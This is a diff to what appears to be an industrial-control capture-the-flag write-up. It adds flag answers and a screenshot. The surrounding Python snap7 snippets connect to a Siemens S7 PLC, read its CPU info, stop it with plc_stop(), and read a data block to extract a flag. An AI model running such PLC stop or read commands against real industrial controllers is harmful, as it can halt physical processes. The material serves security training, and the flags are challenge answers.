@@ -14,7 +14,7 @@ client.connect(PLC_IP, PLC_RACK, PLC_SLOT, PLC_PORT)
 print(client.get_cpu_info())
 ````
 
-
+FLAG : _ECW{FRLCUR289}_, thanks _DGA_ for this challenge ! 
 
 ---
 
@@ -26,6 +26,10 @@ client = snap7.client.Client()
 client.connect(PLC_IP, PLC_RACK, PLC_SLOT, PLC_PORT)
 client.plc_stop()
 ````
+
+<p align="center"><img src="./Screenshots/flagPLCs72.png"></p>
+
+FLAG : _ECW{S7-315-stop}_ , Thanks _DGA_ for this challenge !
 
 ---
 
@@ -48,6 +52,7 @@ for i in range(5000):
 client.disconnect()
 ````
 
+
 ````python3
 import snap7
 client = snap7.client.Client()
@@ -56,6 +61,8 @@ dbn, size = 6485, 200 #220 => enough to read the flag
 buffer = client.db_read(dbn, 0, size)
 print(buffer)
 ````
+
+FLAG : _ECW{Variable-Flag-159}_ , Thanks _DGA_ for this challenge !
 
 ---
 
@@ -87,3 +94,5 @@ int __stdcall sub_1000551B4(char a1, void *Dst)
   return CString::~CString((CString *)&a1);
 }
 ````
+
+Flag : _ECW{plcFLM12}_
